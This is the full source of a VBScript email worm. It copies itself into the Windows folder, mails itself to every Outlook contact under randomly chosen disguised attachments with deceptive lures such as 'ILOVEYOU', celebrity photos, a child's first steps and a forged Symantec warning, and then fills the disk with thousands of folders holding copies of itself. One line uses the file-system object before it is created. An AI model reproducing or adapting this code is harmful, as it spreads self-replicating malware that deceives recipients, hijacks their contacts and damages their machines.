' In memory of all those fine worms
' Just keep in memory that they survived by ignorant Win$ users


Dim fso

windir = fso.GetSpecialfolder(0)

Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
Set pm = fso.CreateTextFile(fso.BuildPath(windir, ("Rundows.dlx                             .vbs")), True)
Set s = fso.OpenTextFile(WScript.ScriptFullName,1)
		
		coding = s.ReadAll
		pm.Write coding
		pm.Close



sender()
Function sender()
	Set O = CreateObject("Outlook.Application")
		Set mapi = O.GetNameSpace("MAPI")
For Each AL In mapi.AddressLists
	If AL.AddressEntries.Count <> 0 Then
		For AddListCount = 1 To AL.AddressEntries.Count
			Set ALE = AL.AddressEntries(AddListCount)
			Set go = O.CreateItem(0)
				go.To = ALE.Address
		Randomize
				num = Int((12*Rnd)+1)
			Set c = fso.GetFile(WScript.ScriptFullName)

	If num = 1 then
		c.Copy(windir&"\Love-letter-for-you.txt.vbs")
		go.Subject = "ILOVEYOU"
		go.Body = "kindly check the attached LOVELETTER coming from me."
		go.Attachments.Add fso.BuildPath(windir,"Love-letter-for-you.txt.vbs")

	elseif num = 2 then
		c.Copy(windir&"\Cartolina.vbs")
		go.Subject = "C'è una cartolina per te!"
		go.Body = "Ciao, un tuo amico ti ha spedito una cartolina virtuale... mooolto particolare!"
		go.Attachments.Add fso.BuildPath(windir,"Cartolina.vbs")
	
	elseif num = 3 then
		c.Copy(windir&"\JENNIFERLOPEZ_NAKED.JPG.vbs")
		go.Subject = "Where are you?"
		go.Body = "This is my pic in the beach!"
		go.Attachments.Add fso.BuildPath(windir,"JENNIFERLOPEZ_NAKED.JPG.vbs")
	
	elseif num = 4 then
		c.Copy(windir&"\AnnaKournikova.jpg.vbs")
		go.Subject = "Here you have, ;o)"
		go.Body = "Hi:" & VbCrlf & "Check This!"
		go.Attachments.Add fso.BuildPath(windir,"AnnaKournikova.jpg.vbs")
	
	elseif num = 5 then
		c.Copy(windir&"\Mawanella.vbs")
		go.Subject = "Mawanella"
		go.Body = "Mawanella is one of the Sri Lanka's Muslim Village"
		go.Attachments.Add fso.BuildPath(windir,"Mawanella.vbs")
	
	elseif num = 6 then
		c.Copy(windir&"\Homepage.HTML.vbs")
		go.Subject = "Homepage"
		go.Body = "Hi!" & VbCrlf & "You've got to see this page! It's really cool ;O)"
		go.Attachments.Add fso.BuildPath(windir,"Homepage.HTML.vbs")

	elseif num = 7 then
		c.Copy(windir&"\MyFirstSteps.JPG                           .vbs")
		go.Subject = "My little baby girl"
		go.Body = "Hi!" & VbCrlf & "I want you to share my little daughter's first steps" & VbCrlf & "Isn't she cute!"
		go.Attachments.Add fso.BuildPath(windir,"MyFirstSteps.JPG                           .vbs")
	
	elseif num = 8 then
		c.Copy(windir&"\Mbop!.vbs")
		go.Subject = "Rv: 4You."
		go.Body = "Mbop!"
		go.Attachments.Add fso.BuildPath(windir,"Mbop!.vbs")
	
	elseif num = 9 then
		c.Copy(windir&"\AngelinaJulie.txt.vbs")
		go.Subject = "Read the true history on Angelina Julie"
		go.Body = "Your life" & VbCrlf & "Your work" & VbCrlf & "Your lovers"
		go.Attachments.Add fso.BuildPath(windir,"AngelinaJulie.txt.vbs")
	
	elseif num = 10 then
		c.Copy(windir&"\F__ker.hta")
		go.Subject = "F__K YOU!"
		go.Body = "THATS RIGHT!" & VbCrlf & "I SAID F__K YOU!" & VbCrlf & "I FIGURED SINCE SATANIK CHILD F__KED ME, AND" & VbCrlf & "QUITE GOOD I MIGHT ADD!" & VbCrlf & "I THOUGHT YOU MIGHT WANNA GET F__KED BY" & VbCrlf & "HIM TOO" & VbCrlf & "TRUST ME YOU WON'T REGRET THIS!"
		go.Attachments.Add fso.BuildPath(windir,"F__ker.hta")
	
	elseif num = 11 then
		c.Copy(windir&"\www.symantec.com.vbs")
		go.Subject = "FW: Symantec Anti-Virus Warning"
		go.Body = "----- Original Message -----" & VbCrlf & "From: <warning@symantec.com>" & VbCrlf & "Subject: FW: Symantec Anti-Virus Warning" & VbCrlf & VbCrlf & VbCrlf &"Hello," & VbCrlf & VbCrlf & "There is a new worm on the Net." & VbCrlf & "This worm is very fast-spreading and very dangerous!" & VbCrlf & VbCrlf & "Symantec has first noticed it on April 04, 2001." & VbCrlf & VbCrlf & "The attached file is a description of the worm and how it" & VbCrlf & "replicates itself." & VbCrlf & VbCrlf & VbCrlf & "With regards," & VbCrlf & "F. Jones" & VbCrlf & "Symantec senior developer"
		go.Attachments.Add fso.BuildPath(windir,"www.symantec.com.vbs")

	elseif num = 12 then
		c.Copy(windir&"\Untitled.htm")
			go.Subject = "Help"
			go.Body = " "
			go.Attachments.Add fso.BuildPath(windir,"Untitled.htm")
			End If
				If go.To <> "" Then
				go.Send
			End If
		Next
	End If
Next
End Function

foldermake()
Function foldermake()
Set d = fso.GetFile(WScript.ScriptFullName)

If Not fso.FolderExists("c:\framedd") Then
Set makk = fso.CreateFolder("c:\framedd")
End If

tel = 0

Do
tel = tel + 1
Set mak = fso.CreateFolder("c:\framedd\framed 1" & tel)
d.Copy("c:\framedd\framed 1" & tel &("\MyFirstSteps.JPG                           .vbs"))
Loop Until fso.FolderExists("c:\framedd\framed 12001")
End Function